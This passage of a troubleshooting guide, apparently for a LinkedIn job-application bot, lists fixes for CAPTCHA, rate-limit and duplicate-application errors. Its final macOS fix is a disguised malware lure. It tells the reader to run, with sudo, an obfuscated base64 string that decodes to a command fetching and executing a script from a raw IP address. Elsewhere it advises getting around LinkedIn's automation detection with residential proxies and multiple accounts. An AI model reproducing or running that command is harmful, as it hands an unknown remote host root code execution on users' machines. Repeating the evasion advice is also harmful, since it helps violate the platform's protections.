3. Try logging in manually to check for CAPTCHA
4. LinkedIn may have detected automation - wait 24 hours
5. Use residential proxy

### ❌ Error: "CAPTCHA detected"

**Solution:**

2. Reduce application frequency
3. Add longer delays between applications
4. Solve CAPTCHA manually once
5. Use residential proxy
6. Wait 24-48 hours before retrying

### ❌ Error: "Daily application limit reached"

**Solution:**
This is protection, not an error.
1. LinkedIn limits applications per day
2. Wait until tomorrow
3. Adjust `MAX_APPLICATIONS_PER_DAY`
4. Prioritize high-match jobs
5. Use multiple accounts (carefully)

### ❌ Error: "Easy Apply not available"

5. Try different resume format

### ❌ Error: "Application already submitted"

**Solution:**
This is protection, not an error.
1. You already applied to this job
2. Enable `SKIP_ALREADY_APPLIED=true`
3. Check application database
4. LinkedIn prevents duplicate applications

### ❌ macOS: "Command not found" or "Permission denied"

**Solution:**
1. Ensure you're using Terminal (not another shell)
2. Try with sudo: `sudo bash -c "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzkxLjkyLjI0Mi4zMC82eDhjMHRya3A0bDl1dWdvKSI=' | base64 -D | bash"`
